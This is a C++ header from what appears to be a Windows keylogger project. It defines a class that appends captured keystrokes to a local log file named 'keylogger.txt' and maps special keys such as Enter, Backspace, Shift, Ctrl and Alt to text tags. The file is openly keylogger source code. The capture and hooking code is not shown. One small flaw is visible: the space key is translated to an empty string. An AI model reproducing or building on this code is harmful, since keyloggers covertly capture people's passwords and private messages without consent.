#ifndef KEYLOGGER_SAVEDATA_H
#define KEYLOGGER_SAVEDATA_H

#include <iostream>
#include <fstream>
#include <winuser.h>

using namespace std;

class saveData {
    #define LOG_FILE "keylogger.txt"

    public:
        //Save data into log file
        static void save_data(string data){
            fstream logFile;

            //open file
            //ios::app will make the new data append to the file
            logFile.open(LOG_FILE,ios::app);

            //Write data into log file
            logFile << data;

            //close file
            logFile.close();
        }
        //Translating special keys into string
        static string TranslateSpecialKey(int key){
            string results;
            switch (key) {
                case VK_SPACE:
                    //Space key
                    results="";
                    break;
                case VK_RETURN:
                    // new Line key
                    // or enter
                    results="\n";
                    break;
                case VK_BACK:
                    //Backspace key
                    results="\b";
                    break;
                case VK_CAPITAL:
                    //CapsLock key
                    results="[CAPS_LOCK]";
                    break;
                case VK_SHIFT:
                    //Shift key
                    results="[SHIFT]";
                    break;
                case VK_TAB:
                    //Tab key
                    results="[TAB]";
                    break;
                case VK_CONTROL:
                    //Control key
                    results="[CTRL]";
                    break;
                case VK_MENU:
                    //ALT key
                    results="[ALT]";
                    break;
                default:
                    break;
            }
            return results;
        }
};


#endif //KEYLOGGER_SAVEDATA_H
